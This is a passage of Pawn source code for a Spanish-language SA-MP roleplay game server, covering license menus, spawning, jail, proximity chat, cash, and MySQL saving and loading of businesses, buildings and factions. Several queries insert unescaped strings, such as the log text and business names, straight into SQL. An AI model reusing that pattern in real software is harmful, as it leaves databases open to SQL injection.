					PlayerInfo[playerid][pPhoneNumber] = phoneNumber;
					PlayerInfo[playerid][pPhoneC] = business;
					PlayerInfo[playerid][pListNumber] = 0;
					if(Business[business][bOwnerSQLID] != -1) {
					   	Business[business][bTill] += PRICE_UNLISTEDPHONE / 2;
	        			Business[business][bProducts]--;
	        			saveBusiness(business);
					}
				} else {
				    SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el dinero suficiente!");
				}
	        }
		}
	} else if(currentMenu == licenseMenu) {
		switch(row) {
	   		case 0: {
	   		    if(playerLicense[playerid][lDTaking] == 1) {
	   		        SendClientMessage(playerid, COLOR_YELLOW2, "�Ya estas tomando una licencia!");
	   		    } else if(GetPlayerCash(playerid) >= PRICE_LIC_DRIVING) {
			    	if(PlayerInfo[playerid][pCarLic] == 0) {
						SendClientMessage(playerid, COLOR_WHITE, "�La prueba ha comenzado!, sal del edificio e ingresa a uno de los autos blancos situados en el estacionamiento.");
						playerLicense[playerid][lDTaking] = 1;
					} else {
						SendClientMessage(playerid, COLOR_YELLOW2, "�No puedes tener m�s de una licencia de conducci�n!");
					}
	   		    } else {
	   		        SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el dinero suficiente!");
	   		    }
	   		}
	   		case 1: {
                SendClientMessage(playerid, COLOR_YELLOW2, "Esta licencia no se encuentra disponible actualmente.");
	   		}
	   		case 2: {
	   		    if(PlayerInfo[playerid][pFlyLic] == 0) {
		   		    if(GetPlayerCash(playerid) >= PRICE_LIC_FLYING) {
			   			PlayerInfo[playerid][pFlyLic] = 1;
			    	 	GivePlayerCash(playerid, -PRICE_LIC_FLYING);
		                SendFMessage(playerid, COLOR_LIGHTGREEN, "�Felicidades, has conseguido la licencia de vuelo por $%d!", PRICE_LIC_FLYING);
		           	} else {
		           	    SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el dinero suficiente!");
		           	}
		        } else {
		            SendClientMessage(playerid, COLOR_YELLOW2, "�Ya tienes una licencia de vuelo!");
		        }
	   		}
		}
	}

	// Descongelamos al jugador luego de elegir una opci�n.
	TogglePlayerControllable(playerid, true);
	return 1;
}

public OnPlayerExitedMenu(playerid) {
	// Descongelamos al jugador en caso de salir de un men�.
	TogglePlayerControllable(playerid, true);
    return 1;
}

SetNormalPlayerGunSkills(playerid)
{
    SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL, 600);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_PISTOL_SILENCED, 20);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_DESERT_EAGLE, 20);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_SHOTGUN, 20);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MP5, 20);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_AK47, 20);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_M4, 20);
	SetPlayerSkillLevel(playerid, WEAPONSKILL_MICRO_UZI, 20);
}

public SetPlayerSpawn(playerid)
{
    if(AdminDuty[playerid] == 1)
		SetPlayerHealthEx(playerid, 9999);
	else
		SetPlayerArmour(playerid, PlayerInfo[playerid][pArmour]);

    SetNormalPlayerGunSkills(playerid);

	if(!GetPlayerInterior(playerid))
		SetPlayerWeather(playerid, weatherVariables[0]);
	else
		SetPlayerWeather(playerid, INTERIOR_WEATHER_ID);

	syncPlayerTime(playerid);

	SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
	SetPlayerColor(playerid, 0xFFFFFF00);
	
	SetPlayerFightingStyle(playerid, PlayerInfo[playerid][pFightStyle]);

	ResetMaskLabel(playerid);
    usingMask[playerid] = false; // Al spawnear, deja de estar con la mascara puesta

    HidePlayerSpeedo(playerid);
    KillTimer(pSpeedoTimer[playerid]); // Si murio arriba del auto, borramos el timer recursivo que muestra la gasolina

 	switch(PlayerInfo[playerid][pJailed])
	 {
   		case 1:
		   {
   		    // Jail IC.
   		    TogglePlayerControllable(playerid, 0);
   		    SetTimerEx("Unfreeze", 4000, false, "i", playerid);
   		    SetPlayerVirtualWorld(playerid, Building[2][blInsideWorld]);
   		    SetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
	    	SetPlayerFacingAngle(playerid, PlayerInfo[playerid][pA]);
	    	SetPlayerInterior(playerid, 3);
		    PlayerInfo[playerid][pHealth] = 100;
		    SetCameraBehindPlayer(playerid);
		    return 1;
		}
		case 2:
		{
		    // Jail OOC.
		    SetPlayerVirtualWorld(playerid, 0);
		    TogglePlayerControllable(playerid, 0);
		    SetTimerEx("Unfreeze", 4000, false, "i", playerid);
		    SetPlayerInterior(playerid, 6);
		    PlayerInfo[playerid][pHealth] = 100;
			SetPlayerPos(playerid, 1412.01, -2.59, 1001.47);
			SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "{FF4600}[Castigo OOC]:{C8C8C8} todav�a no ha finalizado tu castigo.");
			return 1;
		}
	}

	if(PlayerInfo[playerid][pRegStep] != 0)
	{
	    TogglePlayerControllable(playerid, false);
		SetPlayerCameraPos(playerid, -1828.273, -32.900, 1061.583);
		SetPlayerCameraLookAt(playerid, -1828.288, -30.311, 1061.143, 2);
        SetPlayerPos(playerid, -1828.2881, -30.3119, 1061.1436);
	}
	else
	{
	    SetPlayerPos(playerid, PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ]);
	    SetPlayerFacingAngle(playerid, PlayerInfo[playerid][pA]);
     	SetPlayerInterior(playerid, PlayerInfo[playerid][pInterior]);
     	SetPlayerVirtualWorld(playerid, PlayerInfo[playerid][pVirtualWorld]);
     	SetCameraBehindPlayer(playerid);
	}
    
	return 1;
}


public ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		//radi = 2.0; //Trigger Radius
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		//printf("DEBUG: X:%f Y:%f Z:%f",posx,posy,posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
		    if(GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid))
		    {
				return 1;
			}
		}
	}
	return 0;
}
stock ProxDetector(Float:radi, playerid, string[], col1, col2, col3, col4, col5, showSelf = 1) {
	new Float:posx, Float:posy, Float:posz;
	new Float:oldposx, Float:oldposy, Float:oldposz;
	new Float:tempposx, Float:tempposy, Float:tempposz;

	GetPlayerPos(playerid, oldposx, oldposy, oldposz);
	foreach(new i : Player)	{
	    if(showSelf == 0 && i == playerid) {
			continue;
		}
		GetPlayerPos(i, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi/16) && (tempposx > -radi/16)) && ((tempposy < radi/16) && (tempposy > -radi/16)) && ((tempposz < radi/16) && (tempposz > -radi/16)))
		{
		    if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
		    {
				SendClientMessage(i, col1, string);
			}
		}
		else if (((tempposx < radi/8) && (tempposx > -radi/8)) && ((tempposy < radi/8) && (tempposy > -radi/8)) && ((tempposz < radi/8) && (tempposz > -radi/8)))
		{
            if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
            {
				SendClientMessage(i, col2, string);
			}
		}
		else if (((tempposx < radi/4) && (tempposx > -radi/4)) && ((tempposy < radi/4) && (tempposy > -radi/4)) && ((tempposz < radi/4) && (tempposz > -radi/4)))
		{
		    if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
		    {
				SendClientMessage(i, col3, string);
			}
		}
		else if (((tempposx < radi/2) && (tempposx > -radi/2)) && ((tempposy < radi/2) && (tempposy > -radi/2)) && ((tempposz < radi/2) && (tempposz > -radi/2)))
		{
		    if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
		    {
				SendClientMessage(i, col4, string);
			}
		}
		else if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
            if(GetPlayerVirtualWorld(i) == GetPlayerVirtualWorld(playerid))
            {
				SendClientMessage(i, col5, string);
			}
		}
	}
	return 1;
}
strtok(string[],&idx,seperator = ' ')
{
	new ret[128], i = 0, len = strlen(string);
	while(string[idx] == seperator && idx < len) idx++;
	while(string[idx] != seperator && idx < len)
	{
	    ret[i] = string[idx];
	    i++;
		idx++;
	}
	while(string[idx] == seperator && idx < len) idx++;
	return ret;
}

//=====================================================[SERVERSIDE WEAPON FUNCTIONS]===========================================

stock bool:GivePlayerGun(playerid, weapon, ammo)
{
	if(GetHandItem(playerid, HAND_RIGHT) == 0)
 		SetHandItemAndParam(playerid, HAND_RIGHT, weapon, ammo);
	else if(GetHandItem(playerid, HAND_LEFT) == 0)
	    SetHandItemAndParam(playerid, HAND_LEFT, weapon, ammo);
	else
 		return false; // No se pudo entregar el arma por tener las manos ocupadas
	return true; // Se pudo entregar el arma
}

stock bool:RemovePlayerGun(playerid, weapon)
{
	if(GetItemType(GetHandItem(playerid, HAND_RIGHT)) == ITEM_WEAPON)
 		SetHandItemAndParam(playerid, HAND_RIGHT, 0, 0);
	else if(GetItemType(GetHandItem(playerid, HAND_LEFT)) == ITEM_WEAPON)
	    SetHandItemAndParam(playerid, HAND_LEFT, 0, 0);
	else
 		return false; // No tenia un arma
	return true; // Se sac� el arma, en orden mano derecha - mano izquierda
}

//=====================================================[SERVERSIDE CASH FUNCTIONS]=============================================

stock GivePlayerCash(playerid, money) {
	PlayerInfo[playerid][pCash] += money;
	ResetMoneyBar(playerid);//Resets the money in the original moneybar, Do not remove!
	UpdateMoneyBar(playerid,PlayerInfo[playerid][pCash]);//Sets the money in the moneybar to the serverside cash, Do not remove!
	return PlayerInfo[playerid][pCash];
}

stock TakePlayerCash(playerid, money) {
	PlayerInfo[playerid][pCash] -= money;
	ResetMoneyBar(playerid);//Resets the money in the original moneybar, Do not remove!
	UpdateMoneyBar(playerid,PlayerInfo[playerid][pCash]);//Sets the money in the moneybar to the serverside cash, Do not remove!
	return PlayerInfo[playerid][pCash];
}

stock SetPlayerCash(playerid, money) {
	PlayerInfo[playerid][pCash] = money;
	ResetMoneyBar(playerid);//Resets the money in the original moneybar, Do not remove!
	UpdateMoneyBar(playerid,PlayerInfo[playerid][pCash]);//Sets the money in the moneybar to the serverside cash, Do not remove!
	return PlayerInfo[playerid][pCash];
}

stock ResetPlayerCash(playerid) {
	PlayerInfo[playerid][pCash] = 0;
	ResetMoneyBar(playerid);//Resets the money in the original moneybar, Do not remove!
	UpdateMoneyBar(playerid,PlayerInfo[playerid][pCash]);//Sets the money in the moneybar to the serverside cash, Do not remove!
	return PlayerInfo[playerid][pCash];
}

stock GetPlayerCash(playerid) {
	return PlayerInfo[playerid][pCash];
}

//=====================================================================================================================================

stock log(playerid, logType, text[])
{
	new year, month, day,
	    hour, minute, second,
	    name[32],
		query[512];
		
	getdate(year, month, day);
	gettime(hour, minute, second);
	GetPlayerName(playerid, name, 24);
	mysql_real_escape_string(name, name, 1, sizeof(name));
	
	if(logType == LOG_ADMIN) {
		format(query, sizeof(query), "INSERT INTO `log_admin` (pID, pName, pIP, date, text) VALUES (%d, '%s', '%s', '%02d-%02d-%02d %02d:%02d:%02d', '%s')",
			PlayerInfo[playerid][pID],
			name,
			PlayerInfo[playerid][pIP],
			year,
			month,
			day,
			hour,
			minute,
			second,
			text
		);
		mysql_function_query(dbHandle, query, false, "", "");
	} else if(logType == LOG_MONEY) {
		format(query, sizeof(query), "INSERT INTO `log_money` (pID, pName, pIP, date, text) VALUES (%d, '%s', '%s', '%02d-%02d-%02d %02d:%02d:%02d', '%s')",
			PlayerInfo[playerid][pID],
			name,
			PlayerInfo[playerid][pIP],
			year,
			month,
			day,
			hour,
			minute,
			second,
			text
		);
		mysql_function_query(dbHandle, query, false, "", "");
	} else if(logType == LOG_INPUTS) {
		format(query, sizeof(query), "INSERT INTO `log_inputs` (pID, pName, pIP, date, text) VALUES (%d, '%s', '%s', '%02d-%02d-%02d %02d:%02d:%02d', '%s')",
			PlayerInfo[playerid][pID],
			name,
			PlayerInfo[playerid][pIP],
			year,
			month,
			day,
			hour,
			minute,
			second,
			text
		);
		mysql_function_query(dbHandle, query, false, "", "");
	} /*else 	if(logType == LOG_CHAT) {
		format(query, sizeof(query), "INSERT INTO `log_chat` (pID, pName, pIP, date, text) VALUES (%d, '%s', '%s', '%02d-%02d-%02d %02d:%02d:%02d', '%s')",
			PlayerInfo[playerid][pID],
			name,
			PlayerInfo[playerid][pIP],
			year,
			month,
			day,
			hour,
			minute,
			second,
			text
		);
		mysql_function_query(dbHandle, query, false, "", "");
	}*/
	return 1;
}

stock initiateHospital(playerid)
{
	TogglePlayerControllable(playerid, false);
	SetPlayerVirtualWorld(playerid, 0);
	SetPlayerInterior(playerid, 0);

	if(random(2) == 0)
	{
		SetPlayerPos(playerid, 1188.4574,-1309.2242,10.5625);
		SetPlayerCameraPos(playerid,1188.4574,-1309.2242,13.5625+6.0);
		SetPlayerCameraLookAt(playerid,1175.5581,-1324.7922,18.1610);

		SetPVarInt(playerid, "hosp", 1);
	} else
	{
		SetPlayerPos(playerid, 1999.5308,-1449.3281,10.5594);
		SetPlayerCameraPos(playerid,1999.5308,-1449.3281,13.5594+6.0);
		SetPlayerCameraLookAt(playerid,2036.2179,-1410.3223,17.1641);

	    SetPVarInt(playerid, "hosp", 2);
	}

	SendClientMessage(playerid, COLOR_YELLOW2, "Debes reposar un tiempo en el hospital hasta recuperarte.");
	SendClientMessage(playerid, COLOR_YELLOW2, "Antes de ser dado de alta el personal del hospital te quitar� las armas y te cobrar� una suma por el tratamiento recibido.");
	PlayerInfo[playerid][pHospitalized] = 2;
	SetPlayerHealthEx(playerid, 10);
	return 1;
}

//===[SISTEMA DE NEGOCIOS]======================================================
SaveAllBusiness() {
	new
		id = 1;

	while(id < MAX_BUSINESS) {
		saveBusiness(id);
		id++;
	}
	print("[INFO]: negocios guardados.");
	return 1;
}

stock saveBusiness(id) {
    new
		query[1024];

	if(dontsave) return 1;

	ReloadBizIcon(id);
	if(Business[id][bDelete]) {
	    format(query, sizeof(query), "DELETE FROM `business` WHERE `bID` = %d", id);
	    mysql_function_query(dbHandle, query, false, "", "");
		Business[id][bDelete] = false;
		Business[id][bLoaded] = false;
	} else if(Business[id][bInsert]) {
		format(query, sizeof(query), "INSERT INTO `business` (bID, bName, bOutsideX, bOutsideY, bOutsideZ, bEntranceCost, bOutsideInt, bLocked, bEnterable, bOutsideAngle)");
		format(query, sizeof(query), "%s VALUES (%d, '%s', %f, %f, %f, %d, %d, %d, %d, %f)",
			query,
			id,
			Business[id][bName],
			Business[id][bOutsideX],
			Business[id][bOutsideY],
			Business[id][bOutsideZ],
			Business[id][bEntranceFee],
			Business[id][bOutsideInt],
			Business[id][bLocked],
			Business[id][bEnterable],
			Business[id][bOutsideAngle]
		);
		mysql_function_query(dbHandle, query, false, "", "");
		Business[id][bInsert] = false;
	} else {
		format(query, sizeof(query), "UPDATE `business` SET `bOwnerID`='%d', `bEnterable`='%d', `bOutsideInt`=%d, `bInsideInt`=%d, `bPrice`=%d, `bEntranceCost`=%d, `bTill`=%d, `bLocked`=%d, `bType`=%d, `bProducts`=%d",
			Business[id][bOwnerSQLID],
			Business[id][bEnterable],
			Business[id][bOutsideInt],
			Business[id][bInsideInt],
			Business[id][bPrice],
			Business[id][bEntranceFee],
			Business[id][bTill],
			Business[id][bLocked],
			Business[id][bType],
			Business[id][bProducts]
		);
		format(query, sizeof(query), "%s, `bOwnerName`='%s', `bName`='%s', `bOutsideX`=%f, `bOutsideY`=%f, `bOutsideZ`=%f, `bOutsideAngle`=%f, `bInsideX`=%f, `bInsideY`=%f, `bInsideZ`=%f, `bInsideAngle`=%f WHERE `bID`=%d",
			query,
			Business[id][bOwner],
			Business[id][bName],
			Business[id][bOutsideX],
			Business[id][bOutsideY],
			Business[id][bOutsideZ],
			Business[id][bOutsideAngle],
			Business[id][bInsideX],
			Business[id][bInsideY],
			Business[id][bInsideZ],
			Business[id][bInsideAngle],
			id
		);
		mysql_function_query(dbHandle, query, false, "", "");
	}
	return 1;
}

stock LoadBusiness() {
	new
		query[128],
		id = 1;

	while(id < MAX_BUSINESS) {
		format(query, sizeof(query),"SELECT * FROM `business` WHERE `bID` = %d LIMIT 1", id);
		mysql_function_query(dbHandle, query, true, "OnBusinessDataLoad", "i", id);
		Business[id][bOutsideLabel] = CreateDynamic3DTextLabel("-", COLOR_WHITE, Business[id][bOutsideX], Business[id][bOutsideY], Business[id][bOutsideZ] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0, -1, 100.0);
		Business[id][bInsideLabel] = CreateDynamic3DTextLabel("-", 0x008080FF, Business[id][bInsideX], Business[id][bInsideY], Business[id][bInsideZ] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, Business[id][bInsideWorld], Business[id][bInsideInt], -1, 100.0);
		id++;
	}
	return 1;
}

stock ReloadBlIcon(blid) {
	new
	    string[128];

	if(!Building[blid][blLoaded])
		return 1;

	DestroyDynamic3DTextLabel(Building[blid][blOutsideLabel]);
	DestroyDynamic3DTextLabel(Building[blid][blInsideLabel]);

	DestroyDynamicPickup(Building[blid][blOutsidePickup]);
	DestroyDynamicPickup(Building[blid][blInsidePickup]);

	if(Building[blid][blDelete])
	    return 1;

	if(Building[blid][blEntranceFee] == 0) {
		format(string, sizeof(string), "{A9E2F3}%s\nPresiona ENTER para entrar", Building[blid][blText]);
	} else {
		format(string, sizeof(string), "{A9E2F3}%s\nCosto de entrada: $%d\nPresiona ENTER para entrar", Building[blid][blText], Building[blid][blEntranceFee]);
	}

	Building[blid][blOutsideLabel] = CreateDynamic3DTextLabel(string, COLOR_WHITE, Building[blid][blOutsideX], Building[blid][blOutsideY], Building[blid][blOutsideZ] + 0.65, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, 0, -1, 100.0);

    format(string, sizeof(string), "{A9E2F3}%s\nPresiona ENTER para salir", Building[blid][blText2]);
	Building[blid][blInsideLabel] = CreateDynamic3DTextLabel(string, COLOR_WHITE, Building[blid][blInsideX], Building[blid][blInsideY], Building[blid][blInsideZ] + 0.65, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, Building[blid][blInsideWorld], -1, -1, 100.0);

	Building[blid][blOutsidePickup] = CreateDynamicPickup(Building[blid][blPickupModel], 1, Building[blid][blOutsideX], Building[blid][blOutsideY], Building[blid][blOutsideZ], -1);
    Building[blid][blInsidePickup] = CreateDynamicPickup(1239, 1, Building[blid][blInsideX], Building[blid][blInsideY], Building[blid][blInsideZ], Building[blid][blInsideWorld]);
	return 1;
}

stock ReloadBizIcon(bizid) {
	new
	    string[256],
		bizType[32];

    if(!Business[bizid][bLoaded])
	    return 1;

	switch(Business[bizid][bType]) {
	    case BIZ_REST: bizType = "Restaurant";
	    case BIZ_PHON: bizType = "Compa��a telefonica";
	    case BIZ_247: bizType = "Tienda 24-7";
	    case BIZ_AMMU: bizType = "Armer�a";
	    case BIZ_ADVE: bizType = "Publicidad";
	    case BIZ_CLOT,BIZ_CLOT2: bizType = "Tienda de ropa";
	    case BIZ_CLUB: bizType = "Bar";
	    case BIZ_CASINO: bizType = "Casino";
	    case BIZ_HARD: bizType = "Ferreter�a";
	    case BIZ_CLUB2: bizType = "Discoteca/Club Nocturno";
	    case BIZ_PIZZERIA: bizType = "Pizzeria";
	    case BIZ_BURGER1: bizType = "McDonals";
		case BIZ_BURGER2: bizType = "Burger King";
		case BIZ_BELL: bizType = "Comidas R�pidas";
		case BIZ_ACCESS: bizType = "Tienda de accesorios";
	    default: bizType = "Indefinido";
	}

	DestroyDynamic3DTextLabel(Business[bizid][bOutsideLabel]);
	DestroyDynamic3DTextLabel(Business[bizid][bInsideLabel]);
	DestroyDynamicPickup(Business[bizid][bOutsidePickup]);
	DestroyDynamicPickup(Business[bizid][bInsidePickup]);

	if(Business[bizid][bDelete])
	    return 1;

    if(Business[bizid][bOwnerSQLID] == -1) {
        format(string, sizeof(string), "{A9E2F3}%s\n{31B404}�Negocio a la venta!{A9E2F3}\nCosto: $%d\n{A9E2F3}Tipo: %s\nCosto de entrada: $%d\nPresiona ENTER para entrar", Business[bizid][bName], Business[bizid][bPrice], bizType, Business[bizid][bEntranceFee]);
		Business[bizid][bOutsidePickup] = CreateDynamicPickup(1274, 1, Business[bizid][bOutsideX], Business[bizid][bOutsideY], Business[bizid][bOutsideZ], -1);
	} else {
		format(string, sizeof(string), "{A9E2F3}%s\nCosto de entrada: $%d\n{A9E2F3}Tipo: %s\nPresiona ENTER para entrar", Business[bizid][bName], Business[bizid][bEntranceFee], bizType);
		Business[bizid][bOutsidePickup] = CreateDynamicPickup(1239, 1, Business[bizid][bOutsideX], Business[bizid][bOutsideY], Business[bizid][bOutsideZ], -1);
	}
	Business[bizid][bOutsideLabel] = CreateDynamic3DTextLabel(string, COLOR_WHITE, Business[bizid][bOutsideX], Business[bizid][bOutsideY], Business[bizid][bOutsideZ] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0, -1, 100.0);
	Business[bizid][bInsideLabel] = CreateDynamic3DTextLabel("{A9E2F3}Presiona ENTER para salir", COLOR_WHITE, Business[bizid][bInsideX], Business[bizid][bInsideY], Business[bizid][bInsideZ] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, Business[bizid][bInsideWorld], -1, -1, 100.0);
	Business[bizid][bInsidePickup] = CreateDynamicPickup(19198, 1, Business[bizid][bInsideX], Business[bizid][bInsideY], Business[bizid][bInsideZ], Business[bizid][bInsideWorld]);
	return 1;
}

stock saveBuildings() {
	new
	    id = 1;

    if(dontsave)
		return 1;

	while(id < MAX_BUILDINGS) {
	    saveBuilding(id);
		id++;
	}
	print("[INFO]: edificios guardados.");
	return 1;
}

stock saveBuilding(id) {
    new
		query[1024];

	if(dontsave)
		return 1;

	ReloadBlIcon(id);
	if(Building[id][blDelete]) {
	    format(query, sizeof(query), "DELETE FROM `buildings` WHERE `blID` = %d", id);
	    mysql_function_query(dbHandle, query, false, "", "");
		Building[id][blDelete] = false;
		Building[id][blLoaded] = false;
	} else if(Building[id][blInsert]) {
		Building[id][blInsideWorld] = id + 16000;
		format(query, sizeof(query), "INSERT INTO `buildings` (blID, blText, blText2, blOutsideX, blOutsideY, blOutsideZ, blEntranceFee, blOutsideInt, blOutsideAngle, blLocked, blPickupModel, blInsideWorld)");
		format(query, sizeof(query), "%s VALUES (%d, '%s', '%s', %f, %f, %f, %d, %d, %f, %d, %d, %d)",
			query,
			id,
			Building[id][blText],
			Building[id][blText2],
			Building[id][blOutsideX],
			Building[id][blOutsideY],
			Building[id][blOutsideZ],
			Building[id][blEntranceFee],
			Building[id][blOutsideInt],
			Building[id][blOutsideAngle],
			Building[id][blLocked],
			Building[id][blPickupModel],
			Building[id][blInsideWorld]
		);
		mysql_function_query(dbHandle, query, false, "", "");
		Building[id][blInsert] = false;
	} else {
		format(query, sizeof(query), "UPDATE `buildings` SET blText='%s',blText2='%s', `blOutsideX` = '%f', `blOutsideY` = '%f', `blOutsideZ` = '%f', `blEntranceFee` = %d, `blOutsideInt` = %d, `blOutsideAngle` = '%f', `blInsideX` = '%f', `blInsideY` = '%f', `blInsideZ` = '%f', `blInsideWorld` = '%d'",
			Building[id][blText],
			Building[id][blText2],
			Building[id][blOutsideX],
			Building[id][blOutsideY],
			Building[id][blOutsideZ],
			Building[id][blEntranceFee],
			Building[id][blOutsideInt],
			Building[id][blOutsideAngle],
			Building[id][blInsideX],
			Building[id][blInsideY],
			Building[id][blInsideZ],
			Building[id][blInsideWorld]
		);
		format(query, sizeof(query), "%s, `blInsideInt` = %d, `blInsideAngle` = '%f', `blLocked` = %d, `blPickupModel` = %d, `blFaction` = %d WHERE `blID` = %d",
			query,
			Building[id][blInsideInt],
			Building[id][blInsideAngle],
			Building[id][blLocked],
			Building[id][blPickupModel],
			Building[id][blFaction],
			id
		);
		mysql_function_query(dbHandle, query, false, "", "");
	}
	return 1;
}

stock loadBuildings() {
	new
		query[128],
		bdid = 1;

	while(bdid < MAX_BUILDINGS) {
		format(query, sizeof(query),"SELECT * FROM `buildings` WHERE `blID` = %d LIMIT 1", bdid);
		mysql_function_query(dbHandle, query, true, "OnBuildingDataLoad", "i", bdid);
		Building[bdid][blOutsideLabel] = CreateDynamic3DTextLabel("-", COLOR_WHITE, Building[bdid][blOutsideX], Building[bdid][blOutsideY], Building[bdid][blOutsideZ] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0, -1, 100.0);
		Building[bdid][blInsideLabel] = CreateDynamic3DTextLabel("-", COLOR_WHITE, Building[bdid][blInsideX], Building[bdid][blInsideY], Building[bdid][blInsideZ] + 0.75, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, Building[bdid][blInsideWorld], Building[bdid][blInsideInt], -1, 100.0);
		bdid++;
	}
	return 1;
}

stock LoadServerInfo() {
    new
		query[128];

    format(query, sizeof(query),"SELECT * FROM `server` WHERE ID = 1;");
	mysql_function_query(dbHandle, query, true, "OnServerDataLoad", "");
	print("[INFO]: configuraci�n cargada.");
	return 1;
}

SaveServerInfo() {
    if(dontsave) return 1;
    new query[512];
    format(query,sizeof(query),"UPDATE server SET sVehiclePricePercent = %d, sPlayersRecord = %d, svLevelExp = %d, sDrugRawMats = %d WHERE ID = 1;",
		ServerInfo[sVehiclePricePercent],
		ServerInfo[sPlayersRecord],
		ServerInfo[svLevelExp],
		ServerInfo[sDrugRawMats]
	);
    mysql_function_query(dbHandle, query, false, "", "");
    print("[INFO]: configuraci�n guardada.");
    return 1;
}

stock LoadFactions() {
	new
		query[128],
		id = 1;

	while(id < sizeof(FactionInfo)) {
	    format(query, sizeof(query),"SELECT * FROM `factions` WHERE `id`=%d LIMIT 1", id);
		mysql_function_query(dbHandle, query, true, "OnFactionDataLoad", "i", id);
		id++;
	}
	print("[INFO]: facciones cargadas.");
	return 1;
}

SaveFactions() {
    if(dontsave) return 1;
	new factionid = 0;
	new squery[512], iquery[512];
	new query[1280];
	while(factionid < sizeof(FactionInfo)) {

		format(squery,sizeof(squery),"`Name`='%s', `Rank1`='%s', `Rank2`='%s', `Rank3`='%s', `Rank4`='%s', `Rank5`='%s', `Rank6`='%s', `Rank7`='%s', `Rank8`='%s', `Rank9`='%s', `Rank10`='%s',",
        FactionInfo[factionid][fName],
        FactionInfo[factionid][fRank1],
		FactionInfo[factionid][fRank2],
		FactionInfo[factionid][fRank3],
		FactionInfo[factionid][fRank4],
		FactionInfo[factionid][fRank5],
		FactionInfo[factionid][fRank6],
		FactionInfo[factionid][fRank7],
		FactionInfo[factionid][fRank8],
		FactionInfo[factionid][fRank9],
		FactionInfo[factionid][fRank10]);

		format(iquery,sizeof(iquery),"`Materials`=%d, `Bank`=%d, `JoinRank`=%d, `Type`=%d, `RankAmount`=%d, `AllowJob`=%d, fMissionVeh=%d WHERE `id`=%d",
		FactionInfo[factionid][fMaterials],
		FactionInfo[factionid][fBank],
		FactionInfo[factionid][fJoinRank],
		FactionInfo[factionid][fType],
		FactionInfo[factionid][fRankAmount],
		FactionInfo[factionid][fAllowJob],
		FactionInfo[factionid][fMissionVeh],
		factionid);

        format(query,sizeof(query),"UPDATE `factions` SET %s %s", squery, iquery);

		mysql_function_query(dbHandle, query, false, "", "");

		factionid++;
	}

	print("[INFO]: facciones guardadas.");
	return 1;
}

stock StopMusic(playerid) {
	PlayerPlaySound(playerid, 1069, 0.0, 0.0, 0.0);
}

public ShowStats(playerid, targetid, bool:admin) {
    if(IsPlayerConnected(targetid)) {
		if(gPlayerLogged[targetid]) {
			new
			    location[MAX_ZONE_NAME],
			    Float:health,
			    jText[32],
			    sexText[10],
			    phoneNetwork[32],
			    phoneText[16],
				wLicense[16],
				fLicense[16],
				cLicense[16],
				fRankT[32],
				pFactionName[32];

            GetPlayer2DZone(targetid, location, MAX_ZONE_NAME);
			GetPlayerHealthEx(targetid, health);
			switch(PlayerInfo[targetid][pSex]) {
			    case 0: sexText = "Femenino";
			    case 1: sexText = "Masculino";
			}
			switch(PlayerInfo[targetid][pCarLic]) {
			    case 0: cLicense = "No";
			    case 1: cLicense = "Si";
			}
			switch(PlayerInfo[targetid][pFlyLic]) {
			    case 0: fLicense = "No";
			    case 1: fLicense = "Si";
			}
			switch(PlayerInfo[targetid][pWepLic]) {
			    case 0: wLicense = "No";
			    case 1: wLicense = "Si";
			}
			
			if(PlayerInfo[targetid][pFaction] > 0) {
				format(pFactionName, 32, "%s", FactionInfo[PlayerInfo[targetid][pFaction]][fName]);
				format(fRankT, 32, "%s", GetRankName(PlayerInfo[targetid][pFaction], PlayerInfo[targetid][pRank]));
			} else {
                pFactionName = "Ninguna";
                fRankT = "Ninguno";
			}

			if(PlayerInfo[targetid][pJob] > 0) {
			    format(jText, sizeof(jText), "%s", JobInfo[PlayerInfo[targetid][pJob]][jName]);
			} else {
			    jText = "No";
			}

			if(PlayerInfo[targetid][pPhoneC] == 0) {
				phoneNetwork = "No";
			} else {
